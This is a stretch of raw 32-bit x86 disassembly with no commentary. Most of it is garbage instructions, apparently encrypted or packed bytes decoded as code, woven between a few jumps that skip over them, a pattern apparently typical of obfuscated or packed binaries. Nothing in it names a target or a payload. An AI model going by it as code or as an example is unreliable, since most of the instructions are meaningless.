  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0xc0
  40eb8d:	adc    eax,0xaff7cc3b
  40eb92:	jo     0x40ec04
  40eb94:	ret    
  40eb95:	jg     0x40ec07
  40eb97:	jo     0x40eb69
  40eb99:	adc    al,0x37
  40eb9b:	pop    edi
  40eb9c:	gs jne 0x40ebd3
  40eb9f:	push   ds
  40eba0:	mov    al,0xeb
  40eba2:	pop    esi
  40eba3:	xchg   eax,ecx
  40eba5:	add    al,dh
  40eba7:	cmp    cl,dl
  40eba9:	cmp    al,0x68
  40ebab:	into   
  40ebac:	fld    QWORD PTR [edi+0x36]
  40ebaf:	jnp    0x40ec03
  40ebb1:	iret   
  40ebb2:	sbb    BYTE PTR [esi],0xc4
  40ebb5:	inc    esp
  40ebb6:	out    0xa0,al
  40ebb8:	push   ebx
  40ebb9:	adc    ecx,DWORD PTR ds:0xf0743a3b
  40ebbf:	mov    ah,0x9a
  40ebc1:	rcr    DWORD PTR [ecx-0x13fc2120],0xf3
  40ebc8:	and    eax,0xf98db4f3
  40ebcd:	rcl    DWORD PTR [edi],0x64
  40ebd0:	ret    0xebef
  40ebd3:	jbe    0x40ebb0
  40ebd5:	je     0x40eba1
  40ebd7:	jecxz  0x40eb69
  40ebd9:	fiadd  WORD PTR ds:0x968d23d9
  40ebdf:	xor    BYTE PTR [edi+0x2],dl
  40ebe2:	icebp  
  40ebe3:	scas   al,BYTE PTR es:[edi]
  40ebe4:	ins    DWORD PTR es:[edi],dx
  40ebe5:	jb     0x40eb78
  40ebe7:	push   0x3f
  40ebe9:	gs pop ss
  40ebeb:	shl    DWORD PTR [ecx+0x73],0x33
  40ebef:	xchg   ebx,eax
  40ebf0:	das    
  40ebf1:	push   ss
  40ebf2:	jmp    0xf788:0xee27e3db
  40ebf9:	and    DWORD PTR [edi+0x1c],edi
  40ebfc:	xor    DWORD PTR [esi-0x7b14b532],esi
  40ec02:	push   ecx
  40ec03:	into   
  40ec04:	test   esi,ebx
  40ec06:	pop    ds
  40ec07:	dec    ebx
  40ec08:	aam    0xaa
  40ec0a:	arpl   WORD PTR [eax-0x4a],sp
  40ec0d:	cdq    
  40ec0e:	cmp    BYTE PTR [edi+eax*2+0xd43fdb4],cl
  40ec15:	js     0x40ec96
  40ec17:	push   es
  40ec18:	rcr    BYTE PTR [eax+0x5de73a2d],0x98
  40ec1f:	lds    esi,FWORD PTR [edi+ecx*8-0x2208a6fe]
  40ec26:	fbld   TBYTE PTR [esi]
  40ec28:	mov    dl,0xf0
  40ec2a:	out    dx,eax
  40ec2b:	sbb    al,0xce
  40ec2d:	ja     0x40ec83
  40ec2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec30:	cmp    dh,BYTE PTR [eax]
  40ec32:	xchg   ecx,eax
  40ec33:	jne    0x40ecac
  40ec35:	sbb    DWORD PTR [ebp-0x44],eax
  40ec38:	les    eax,FWORD PTR [edi+0x399bc071]
  40ec3e:	or     al,0x2f
  40ec40:	xchg   DWORD PTR [esi],esi
  40ec42:	sub    BYTE PTR [esi-0x2d],0xf9
  40ec46:	stos   BYTE PTR es:[edi],al
  40ec47:	ins    BYTE PTR es:[edi],dx
  40ec48:	xor    DWORD PTR [ecx],0xf3a5e727
  40ec4e:	ret    
  40ec4f:	add    ecx,ebp
  40ec51:	push   edx
  40ec52:	cmp    al,0xac
  40ec54:	outs   dx,BYTE PTR ds:[esi]
  40ec55:	ins    BYTE PTR es:[edi],dx
  40ec56:	mov    eax,ds:0x2dfecb79
  40ec5b:	dec    edi
  40ec5c:	into   
  40ec5d:	adc    bh,BYTE PTR [ecx-0x66]
  40ec60:	dec    edx
  40ec61:	and    eax,0xb6298ce0
  40ec66:	int3   
  40ec67:	push   cs
  40ec68:	lds    edi,FWORD PTR [edx+0x719470d8]
  40ec6e:	out    0x6c,eax
  40ec70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec71:	xchg   edx,eax
  40ec72:	daa    
  40ec73:	outs   dx,BYTE PTR ds:[esi]
  40ec74:	mov    edx,0x3149f362
  40ec79:	push   edi
  40ec7a:	xchg   al,bh
  40ec7c:	add    BYTE PTR [eax+0x80a3d23],0x52
  40ec83:	inc    ebx
  40ec84:	sbb    BYTE PTR [edx-0x368de123],cl
  40ec8a:	and    dl,BYTE PTR [ecx-0x527ed3a4]
  40ec90:	iret   
  40ec91:	stos   BYTE PTR es:[edi],al
  40ec92:	mov    al,0x6c
  40ec94:	(bad)  
  40ec95:	shl    DWORD PTR [edx],1
  40ec97:	mov    esi,0xaead215b
  40ec9c:	lods   al,BYTE PTR ds:[esi]
  40ec9d:	push   esp
  40ec9e:	dec    ebp
  40ec9f:	repnz aam 0xcd
  40eca2:	dec    eax
  40eca3:	dec    ecx
  40eca4:	jge    0x40ec7b
  40eca6:	rcl    DWORD PTR [ecx],cl
  40eca8:	jmp    0xec6fa8f0
  40ecad:	je     0x40ecb2
  40ecaf:	stos   BYTE PTR es:[edi],al
  40ecb0:	push   eax
  40ecb1:	xchg   eax,esi
  40ecb3:	add    eax,0xfaceff74
  40ecb8:	out    dx,al
  40ecb9:	jne    0x40ec5f
  40ecbb:	adc    eax,0x5bc18077
  40ecc0:	dec    ecx
  40ecc1:	scas   al,BYTE PTR es:[edi]
  40ecc2:	jmp    0xbc146c69
  40ecc7:	lds    eax,FWORD PTR [ebx]
  40ecc9:	xchg   ecx,eax
  40ecca:	stos   BYTE PTR es:[edi],al
  40eccb:	dec    eax
  40eccc:	mov    DWORD PTR [ecx-0x2b],edx
  40eccf:	mov    eax,ds:0x4cf5a162
  40ecd4:	pop    esp
  40ecd5:	and    al,0x54
  40ecd7:	cwde   
  40ecd8:	jmp    0x907d5fe6
  40ecdd:	sub    eax,0x5dca27a5
  40ece2:	lds    edx,FWORD PTR [edi-0x7d]
  40ece5:	cmp    eax,ecx
  40ece7:	mov    eax,DWORD PTR [ebp-0x14]
  40ecea:	movzx  ecx,WORD PTR [ebp-0x4]
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ed38
  40ed00:	adc    eax,0xaeba3cbe
  40ed05:	jo     0x40ed77
  40ed07:	ret    
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ed4b
  40ed0c:	adc    edx,DWORD PTR [edi-0x74]
  40ed0f:	ds push 0xffffffd9
  40ed12:	adc    DWORD PTR [edi-0x61637532],ebx
  40ed18:	push   es
  40ed19:	inc    esi
  40ed1a:	ins    BYTE PTR es:[edi],dx
  40ed1b:	sbb    al,0xaa
  40ed1d:	pop    ds
  40ed1e:	ins    DWORD PTR es:[edi],dx
  40ed1f:	xchg   BYTE PTR [ecx+0x72880c7b],cl
  40ed25:	dec    ecx
  40ed26:	fiadd  DWORD PTR [esi+edi*8]
  40ed29:	test   al,0xa7
  40ed2b:	pop    ebp
  40ed2c:	ins    BYTE PTR es:[edi],dx
  40ed2d:	cmp    eax,0x229e3e76
  40ed32:	cld    
  40ed33:	xor    al,0xeb
  40ed35:	or     edx,DWORD PTR [esi+ebp*4]
  40ed38:	cmp    bl,BYTE PTR [edx+0x3e]
  40ed3b:	scas   al,BYTE PTR es:[edi]
  40ed3c:	jae    0x40ed83
  40ed3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed3f:	inc    ebx
  40ed40:	int    0xd5
  40ed42:	push   es
  40ed43:	push   esp
  40ed44:	mov    cl,0x35
  40ed46:	push   ss
  40ed47:	push   edx
  40ed48:	mov    bh,0xc7
  40ed4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed4b:	outs   dx,BYTE PTR ds:[esi]
  40ed4c:	adc    eax,0x50721339
  40ed51:	ins    DWORD PTR es:[edi],dx
  40ed52:	mov    edx,0xb944f30b
  40ed57:	leave  
  40ed58:	sub    eax,0x760d17e
  40ed5d:	push   ebp
  40ed5e:	xor    eax,0xb33f0e9d
  40ed63:	jb     0x40ecf5
  40ed65:	popa   
  40ed66:	mov    esp,0xb07f543c
  40ed6b:	jo     0x40ed01
  40ed6d:	add    eax,0x19211afa
  40ed72:	inc    ecx
  40ed73:	in     eax,dx
  40ed74:	cld    
  40ed75:	inc    ecx
  40ed76:	and    BYTE PTR [ebp-0x50],al
  40ed79:	jbe    0x40ed76
  40ed7b:	mov    ch,0xf
  40ed7d:	mov    ah,0xfb
  40ed7f:	pop    ds
  40ed80:	(bad)  
  40ed81:	jmp    FWORD PTR [ebx-0x2ff49ad9]
  40ed87:	add    al,0xc2
  40ed89:	data16 daa 
  40ed8b:	fwait
  40ed8c:	mov    eax,0xe165e46a
  40ed91:	lds    edx,FWORD PTR [ecx]
  40ed93:	sub    edi,DWORD PTR [ebx-0x56]
  40ed96:	push   cs
  40ed97:	mov    ds:0x7bfe3058,eax
  40ed9c:	retf   
  40ed9d:	sub    bl,bl
  40ed9f:	ret    
  40eda0:	mov    ebx,0x23816b9d
  40eda5:	cmp    al,0x2c
  40eda7:	push   ebx
  40eda8:	pop    es
  40eda9:	scas   eax,DWORD PTR es:[edi]
  40edaa:	mov    edi,0x61b1be41
  40edaf:	mov    ah,BYTE PTR [eax-0x7cb0f7d8]
  40edb5:	pop    ds
  40edb6:	(bad)  
  40edb7:	idiv   DWORD PTR [edi-0x3c]
  40edba:	iret   
  40edbb:	sub    edx,DWORD PTR [ecx+0x60]
  40edbe:	mov    al,0x48
  40edc0:	call   0xdb6549f9
  40edc5:	sti    
  40edc6:	xchg   edx,eax
  40edc7:	shr    BYTE PTR [esi+ecx*2],cl
  40edca:	das    
  40edcb:	xchg   ecx,eax
  40edcc:	cmp    al,0x96
  40edce:	push   eax
  40edcf:	xchg   BYTE PTR [edi-0x20a9f28d],bl
  40edd5:	(bad)  
  40edd6:	cmp    ah,BYTE PTR [ecx+0x2bb5e4ed]
  40eddc:	aam    0xce
  40edde:	inc    ebx
  40eddf:	mov    ch,0x52
  40ede1:	imul   ecx,eax,0x85a30b57
  40ede7:	cmc    
  40ede8:	jae    0x40ee4f
  40edea:	in     al,dx
  40edeb:	rcr    DWORD PTR ds:0xe33cdff9,1
  40edf1:	xchg   edx,eax
  40edf2:	out    dx,al
  40edf3:	rol    DWORD PTR [ebp+edx*4-0x56f4b389],cl
  40edfa:	xlat   BYTE PTR ds:[ebx]
  40edfb:	rcr    BYTE PTR [edi],0x5b
  40edfe:	push   0xfffffffe
  40ee00:	xchg   ecx,eax
  40ee01:	repnz arpl cx,bp
  40ee04:	int    0xcf
  40ee06:	pop    edi
  40ee07:	push   0x4ec11367
  40ee0c:	aam    0x16
  40ee0e:	push   ss
  40ee0f:	std    
  40ee10:	test   ch,bh
  40ee12:	das    
  40ee13:	outs   dx,DWORD PTR ds:[esi]
  40ee14:	rol    DWORD PTR [ebp+0x33bf0dc2],cl
  40ee1a:	jge    0x40ee36
  40ee1c:	and    ebp,DWORD PTR [ebx]
  40ee1e:	dec    ebp
  40ee1f:	rcr    DWORD PTR [ebx+0x7fdf0b58],cl
  40ee25:	stos   BYTE PTR es:[edi],al
  40ee26:	shr    al,1
  40ee28:	or     dh,BYTE PTR [edx-0x156faf49]
  40ee2e:	mov    dl,0x82
  40ee30:	xchg   ebx,eax
  40ee31:	dec    esi
  40ee32:	loop   0x40edf5
  40ee34:	test   BYTE PTR [eax],ah
  40ee36:	stos   DWORD PTR es:[edi],eax
  40ee37:	jns    0x40eded
  40ee39:	retf   
  40ee3a:	jle    0x40ede2
  40ee3c:	lods   eax,DWORD PTR ds:[esi]
  40ee3d:	mov    edi,0x6127ee78
  40ee42:	(bad)  
  40ee43:	mov    ebp,0x7d433cbb
  40ee48:	lock push 0x800eca78
  40ee4e:	ret    0x937
  40ee51:	push   0xdee334f5
  40ee56:	sbb    al,BYTE PTR [edi+ecx*1]
  40ee59:	(bad)  
  40ee5a:	jns    0x40ee5d
  40ee5c:	add    BYTE PTR [eax],al
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0x46
  40ee7f:	or     eax,DWORD PTR [ebp+0x70ac0dba]
  40ee85:	jo     0x40ee4a
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40ee6d
  40ee8b:	pop    ss
  40ee8c:	xor    DWORD PTR [edi],esi
  40ee8e:	in     al,dx
  40ee8f:	jp     0x40ee95
  40ee91:	mov    dh,0x59
  40ee93:	shr    al,1
  40ee95:	(bad)  
  40ee96:	and    bh,ah
  40ee98:	mov    ah,0x19
  40ee9a:	scas   al,BYTE PTR es:[edi]
  40ee9b:	sub    eax,0xa5d79fb2
  40eea0:	mov    bl,0x28
  40eea2:	push   esp
  40eea3:	pop    ebp
  40eea4:	add    ch,BYTE PTR [ebp+0x59]
  40eea7:	inc    esp
  40eea8:	sub    eax,0x2c427bb4
  40eead:	pop    ebp
  40eeae:	enter  0x525b,0x7f
  40eeb2:	push   es
  40eeb3:	pushf  
  40eeb4:	jecxz  0x40ee94
  40eeb6:	outs   dx,BYTE PTR ds:[esi]
  40eeb7:	push   eax
  40eeb8:	js     0x40ee53
  40eeba:	add    DWORD PTR [ecx-0x26],edi
  40eebd:	push   cs
  40eebe:	push   ss
  40eebf:	push   ecx
  40eec0:	in     eax,0x5a
  40eec2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eec3:	dec    esi
  40eec4:	mov    edx,0x62646d98
  40eec9:	(bad)  
  40eeca:	jg     0x40ef42
  40eecc:	outs   dx,DWORD PTR ds:[esi]
  40eecd:	xchg   esp,eax
  40eece:	jg     0x40eeee
  40eed0:	jmp    0xb09:0x7a5c45bb
  40eed7:	add    DWORD PTR [edx-0x5b47308c],esp
  40eedd:	scas   al,BYTE PTR es:[edi]
  40eede:	xchg   edi,eax
  40eedf:	mov    dh,0x40
  40eee1:	jmp    0xe2fe:0x68e4531a
  40eee8:	xchg   ebx,eax
  40eee9:	jle    0x40ef1e
  40eeeb:	mov    DWORD PTR ds:0x290b1d82,esi
  40eef1:	adc    al,0x3e
  40eef3:	and    esp,ecx
  40eef5:	add    DWORD PTR [ebx-0x70],ebp
  40eef8:	mov    cl,0x4f
  40eefa:	imul   esp,DWORD PTR [ebx+0x42],0x75
  40eefe:	cld    
  40eeff:	add    BYTE PTR [edx],bh
  40ef01:	aam    0xad
  40ef03:	inc    ebp
  40ef04:	inc    edx
  40ef05:	pop    DWORD PTR [edi+0x4f229f60]
  40ef0b:	sub    eax,0x300dca6
  40ef10:	add    BYTE PTR [edi-0x4f],ah
  40ef13:	mov    bl,0x99
  40ef15:	fmul   DWORD PTR [esi+0xac6127]
  40ef1b:	mov    ecx,0xdce9bc69
  40ef20:	push   ebx
  40ef21:	cli    
  40ef22:	in     eax,dx
  40ef23:	fisubr DWORD PTR [ecx]
  40ef25:	inc    edx
  40ef26:	add    eax,0x9d935b22
  40ef2b:	aam    0xc8
  40ef2d:	dec    ebx
  40ef2e:	ss hlt 
  40ef30:	mov    eax,0xabbec1f2
  40ef35:	xchg   ebp,eax
  40ef36:	inc    eax
  40ef37:	add    DWORD PTR [edi+0x49],ebx
  40ef3a:	mov    esp,0xb30e8333
  40ef3f:	aad    0x12
  40ef41:	push   ds
  40ef42:	adc    eax,0x34c1f953
  40ef47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef48:	call   0x2229:0x335fb4f6
  40ef4f:	jecxz  0x40ef35
  40ef51:	pop    ebp
  40ef52:	test   DWORD PTR [ecx+0x8e684e7],edi
  40ef58:	and    BYTE PTR [eax+0x472a1218],bl
  40ef5e:	in     eax,dx
  40ef5f:	aaa    
  40ef60:	mov    ecx,0xcd8a9b2c
  40ef65:	and    al,0x8c
  40ef67:	sub    ebx,DWORD PTR [edi]
  40ef69:	sub    esp,ecx
  40ef6b:	icebp  
  40ef6c:	aaa    
  40ef6d:	dec    edi
  40ef6e:	push   ss
  40ef6f:	les    ecx,FWORD PTR [edi+0x601f828a]
  40ef75:	loope  0x40efb5
  40ef77:	push   edx
  40ef78:	mov    edx,0xbe045e5a
  40ef7d:	mov    ds:0x9fbada9e,eax
  40ef82:	mov    ecx,0x2c8e1f6e
  40ef87:	sub    eax,0xdbcd493d
  40ef8c:	push   esp
  40ef8d:	xlat   BYTE PTR ds:[ebx]
  40ef8e:	mov    ebp,0x5823b0ce
  40ef93:	jno    0x40efee
  40ef95:	shr    DWORD PTR [ebx+0x36ca2a8d],cl
  40ef9b:	gs ds icebp 
  40ef9e:	scas   eax,DWORD PTR es:[edi]
  40ef9f:	xor    edi,DWORD PTR [esi-0x10]
  40efa2:	adc    DWORD PTR [edx],edx
  40efa4:	cld    
  40efa5:	dec    ecx
  40efa6:	cmc    
  40efa7:	imul   esi,DWORD PTR [esi+eiz*1],0xffffffb0
  40efab:	in     eax,dx
  40efac:	adc    bl,BYTE PTR [edi]
  40efae:	in     eax,dx
  40efaf:	cmp    BYTE PTR [ebp-0x67],bl
  40efb2:	retf   0x55eb
  40efb5:	jno    0x40f010
  40efb7:	sti    
  40efb8:	dec    ebp
  40efb9:	rcl    BYTE PTR [edi],1
  40efbb:	cmp    eax,0x618f640b
  40efc0:	fcom   QWORD PTR [eax]
  40efc2:	in     al,dx
  40efc3:	into   
  40efc4:	arpl   dx,ax
  40efc6:	sub    BYTE PTR [esi-0x6e53014c],al
  40efcc:	mov    bh,0x6c
  40efce:	aaa    
  40efcf:	inc    esi
  40efd0:	sub    edi,ebp
  40efd2:	mov    WORD PTR [edx],fs
  40efd4:	sub    eax,0xc6335938
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	arpl   WORD PTR [ebx-0x542f2c7c],bp
  40f000:	jo     0x40f072
  40f002:	ret    
  40f003:	jg     0x40f075
  40f005:	jo     0x40f082
  40f007:	mov    edi,0x7d1f0bff
  40f00c:	cmp    cl,BYTE PTR [esp+eiz*8+0x47]
  40f010:	int    0xb0
  40f012:	push   ecx
  40f013:	imul   ebx,DWORD PTR [edi+0x582e293c],0xc66d6c48
  40f01d:	pop    esp
  40f01e:	addr16 mov ebp,0x6fc1653d
  40f024:	jbe    0x40eff7
  40f026:	loop   0x40f074
  40f028:	push   ebx
  40f029:	add    DWORD PTR [esi+eiz*8],ebp
  40f02c:	pop    esp
  40f02d:	repnz xor edi,DWORD PTR [ecx-0x55cfe8f0]
  40f034:	sub    BYTE PTR ss:[edi-0x6e],0x1e
  40f039:	stos   DWORD PTR es:[edi],eax
  40f03a:	fcomp  DWORD PTR [ecx]
  40f03c:	push   0x52
  40f03e:	pop    eax
  40f03f:	ins    DWORD PTR es:[edi],dx
  40f040:	mov    ch,0xe6
  40f042:	clc    
  40f043:	sub    DWORD PTR [eax],eax
  40f045:	jns    0x40f0bd
  40f047:	bound  ebp,QWORD PTR [ecx]
  40f049:	mov    BYTE PTR [ecx+eiz*8-0x171c24cc],al
  40f050:	cli    
  40f051:	sbb    BYTE PTR [esi+0x44],0xf0
  40f055:	iret   
  40f056:	fcomp  QWORD PTR [eax]
  40f058:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f059:	xor    DWORD PTR [ecx-0x65],esp
  40f05c:	arpl   WORD PTR [ecx],si
  40f05e:	add    eax,0xc74880e1
  40f063:	je     0x40f00e
  40f065:	fidivr WORD PTR [esp+ebp*4+0x16b1bf8a]
  40f06c:	jno    0x40f006
  40f06e:	jp     0x40f05a
  40f070:	push   0x9229ea36
  40f075:	fadd   DWORD PTR [ebx+0x5a272207]
  40f07b:	les    ebp,FWORD PTR [edi+0x43]
  40f07e:	cmp    esi,esp
  40f080:	cmp    al,0x3d
  40f082:	push   ecx
  40f083:	test   BYTE PTR [ebp-0x6e3068fe],dl
  40f089:	repnz pop eax
  40f08b:	icebp  
  40f08c:	std    
  40f08d:	enter  0x4b9b,0x3e
  40f091:	inc    edi
  40f092:	adc    BYTE PTR [eax-0x78],ah
  40f095:	jne    0x40f096
  40f097:	dec    esi
  40f098:	pop    ds
  40f099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f09a:	push   edx
  40f09b:	cmp    eax,0xb09fe988
  40f0a0:	(bad)
  40f0a3:	sub    esi,DWORD PTR [esp+eax*4-0x12]
  40f0a7:	mov    al,0xb2
  40f0a9:	adc    al,0x22
  40f0ab:	arpl   bx,bp
  40f0ad:	test   al,0x1
  40f0af:	add    esp,DWORD PTR [edi-0x6fc18193]
  40f0b5:	add    edx,ecx
  40f0b7:	mov    eax,ds:0xe545e6e2
  40f0bc:	dec    eax
  40f0bd:	call   0xbe80:0xe4b52c09
  40f0c4:	in     al,0xd1
  40f0c6:	loop   0x40f0d9
  40f0c8:	jg     0x40f0dd
  40f0ca:	mov    cs,edx
  40f0cc:	repnz pop esp
  40f0ce:	xor    bl,BYTE PTR [edi-0x5079a81]
  40f0d4:	fld    QWORD PTR [ebx-0x6276f19e]
  40f0da:	sbb    ch,BYTE PTR [ebx-0xa]
  40f0dd:	dec    ebp
  40f0de:	pop    eax
  40f0df:	outs   dx,DWORD PTR ds:[esi]
  40f0e0:	sbb    BYTE PTR [esi-0x34],al
  40f0e3:	jne    0x40f0fc
  40f0e5:	push   esp
  40f0e6:	jae    0x40f092
  40f0e8:	sub    eax,0x7ec8bb0c
  40f0ed:	cdq    
  40f0ee:	out    0x55,al
  40f0f0:	sbb    ecx,esp
  40f0f2:	ds call 0x1d3c8498
  40f0f8:	inc    esp
  40f0f9:	ins    BYTE PTR es:[edi],dx
  40f0fa:	or     al,0x7a
  40f0fc:	div    BYTE PTR [eax+0x4]
  40f0ff:	inc    edi
  40f100:	xchg   ebx,eax
  40f101:	jns    0x40f0ed
  40f103:	mov    esp,esi
  40f105:	adc    DWORD PTR [edx+0x43],eax
  40f108:	stos   BYTE PTR es:[edi],al
  40f109:	leave  
  40f10a:	loop   0x40f0cb
  40f10c:	jnp    0x40f15e
  40f10e:	mov    ah,0x60
  40f110:	call   0xca322516
  40f115:	dec    edi
  40f116:	inc    edi
  40f117:	inc    esi
  40f118:	in     al,dx
  40f119:	jmp    0x8ea0d408
  40f11e:	enter  0x7591,0x36
  40f122:	xor    BYTE PTR [edx+0x54],ch
  40f125:	or     eax,0xa25daf82
  40f12a:	lods   eax,DWORD PTR ds:[esi]
  40f12b:	cmp    eax,0xda645b00
  40f130:	dec    ebp
  40f131:	out    dx,al
  40f132:	(bad)  
  40f133:	sti    
  40f134:	add    ch,BYTE PTR [edi-0x6b830e69]
  40f13a:	inc    BYTE PTR [edx]
  40f13c:	sbb    BYTE PTR [edi+0x19],dl
  40f13f:	push   cs
  40f140:	and    BYTE PTR [edx+ebp*4],bl
  40f143:	es jmp 0x44be:0xf296ec2
  40f14b:	repnz dec edx
  40f14d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f14e:	js     0x40f187
  40f150:	cmp    cl,BYTE PTR [esi+0x78840fc1]
  40f156:	add    DWORD PTR [eax],eax
  40f158:	add    BYTE PTR [ebx+0x65e9f845],cl
  40f15e:	add    DWORD PTR [eax],eax
  40f160:	add    BYTE PTR [ebp+0x71cc29c2],ch
  40f166:	rep ins DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   esi,esp
  40f16e:	addr16 and eax,0x70aaa3c7
  40f174:	jo     0x40f139
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f15a
  40f17a:	mov    esp,0x35a6b20
  40f17f:	add    al,BYTE PTR [edx]
  40f181:	or     edx,DWORD PTR [ebx-0x3951abae]
  40f187:	push   eax
  40f188:	lods   eax,DWORD PTR ds:[esi]
  40f189:	mov    esp,0x622e47ac
  40f18e:	punpcklbw mm7,DWORD PTR [eax+0x17c996f6]
  40f195:	test   eax,0x16841ece
  40f19a:	scas   al,BYTE PTR es:[edi]
  40f19b:	aaa    
  40f19c:	sbb    al,0xbe
  40f19e:	(bad)  
  40f1a0:	xchg   edx,ebp
  40f1a2:	frstor [esi+ecx*1-0x49]
  40f1a6:	add    DWORD PTR [edx+0x4d9e0809],0x14aadf4c
  40f1b0:	xor    esi,DWORD PTR [edx+0x2e9343e3]
  40f1b6:	push   0xffffff92
  40f1b8:	xchg   ebp,eax
  40f1b9:	sbb    ch,dl
  40f1bb:	jae    0x40f174
  40f1bd:	adc    edi,esi
  40f1bf:	cld    
  40f1c0:	ds scas al,BYTE PTR es:[edi]
  40f1c2:	mov    cl,0x15
  40f1c4:	test   eax,0xeba700ce
  40f1c9:	gs dec eax
  40f1cb:	int3   
  40f1cc:	loopne 0x40f1b0
  40f1ce:	fs mov bl,0x4b
  40f1d1:	inc    esi
  40f1d2:	and    eax,0x45b03438
  40f1d7:	and    al,bl
  40f1d9:	nop
  40f1da:	icebp  
  40f1db:	dec    edi
  40f1dc:	jl     0x40f16b
  40f1de:	into   
  40f1df:	jae    0x40f1b1
  40f1e1:	sbb    al,0x85
  40f1e3:	jno    0x40f255
  40f1e5:	shl    ebx,1
  40f1e7:	ins    DWORD PTR es:[edi],dx
  40f1e8:	adc    al,0x1d
  40f1ea:	mov    ah,0x16
  40f1ec:	xor    edx,0x31ca4166
  40f1f2:	clc    
  40f1f3:	push   ds
  40f1f4:	sahf   
  40f1f5:	mov    eax,ds:0x173b1436
  40f1fa:	xor    ch,BYTE PTR [edi+0x3c79c08a]
  40f200:	or     esp,DWORD PTR [esi]
  40f202:	retf   
  40f203:	jbe    0x40f209
  40f205:	push   ebp
  40f206:	leave  
  40f207:	cmp    eax,0x174b456e
  40f20c:	call   0xfba1:0xfa42ad7
  40f213:	jns    0x40f254
  40f215:	pop    edx
  40f216:	inc    esi
  40f217:	(bad)  
  40f218:	out    0xff,al
  40f21a:	push   0xfffffffa
  40f21c:	mov    esi,0xb22409b0
  40f221:	mov    bl,BYTE PTR [edi-0x27be89a1]
  40f227:	cwde   
  40f228:	retf   
  40f229:	inc    ecx
  40f22a:	out    dx,eax
  40f22b:	push   edi
  40f22c:	xchg   esp,eax
  40f22d:	pop    edi
  40f22e:	mov    ds:0x3e3db281,al
  40f233:	es cld 
  40f235:	push   edi
  40f236:	dec    edx
  40f237:	mov    edi,0xeeee843d
  40f23c:	ins    DWORD PTR es:[edi],dx
  40f23d:	add    edi,ebx
  40f23f:	test   ebp,ebp
  40f241:	mov    dl,0x9b
  40f243:	xlat   BYTE PTR ds:[ebx]
  40f244:	xchg   ebx,eax
  40f245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f246:	hlt    
  40f247:	arpl   WORD PTR [ecx],dx
  40f249:	test   DWORD PTR [ecx+0x4a],ebp
  40f24c:	test   al,0xfb
  40f24e:	(bad)  
  40f24f:	scas   eax,DWORD PTR es:[edi]
  40f250:	push   edx
  40f251:	jl     0x40f29c
  40f253:	aas    
  40f254:	cmp    eax,0x9a32beb2
  40f259:	push   edi
  40f25a:	outs   dx,DWORD PTR ds:[esi]
  40f25b:	push   ebp
  40f25c:	popa   
  40f25d:	sub    ebp,eax
  40f25f:	sbb    ch,dh
  40f261:	in     eax,0x4c
  40f263:	mov    ecx,0x14c64e2
  40f268:	enter  0x22ab,0xc8
  40f26c:	adc    BYTE PTR [esi-0x200658f9],dl
  40f272:	xor    edx,edx
  40f274:	ret    
  40f275:	cdq    
  40f276:	cmc    
  40f277:	xchg   esi,eax
  40f278:	or     DWORD PTR [esi],ebp
  40f27a:	iret   
  40f27b:	sub    BYTE PTR [ebp-0x4f],0x67
  40f27f:	outs   dx,BYTE PTR ds:[esi]
  40f280:	push   edi
  40f281:	or     eax,0x69f6183d
  40f286:	cmp    eax,0xc3d7da32
  40f28b:	jmp    0xc88c:0x1b1fc074
  40f292:	jbe    0x40f2e9
  40f294:	(bad)  
  40f295:	inc    ecx
  40f296:	xlat   BYTE PTR ds:[ebx]
  40f297:	pop    eax
  40f298:	int3   
  40f299:	xchg   edx,eax
  40f29a:	push   cs
  40f29b:	jecxz  0x40f2e0
  40f29d:	jl     0x40f2b1
  40f29f:	ja     0x40f2af
  40f2a1:	mov    ds:0xc9c995ba,eax
  40f2a6:	xchg   esi,eax
  40f2a7:	stos   BYTE PTR es:[edi],al
  40f2a8:	arpl   WORD PTR [ebx-0x3a],sp
  40f2ab:	mov    cs,WORD PTR [ebx-0x1ef2ce17]
  40f2b1:	ins    DWORD PTR es:[edi],dx
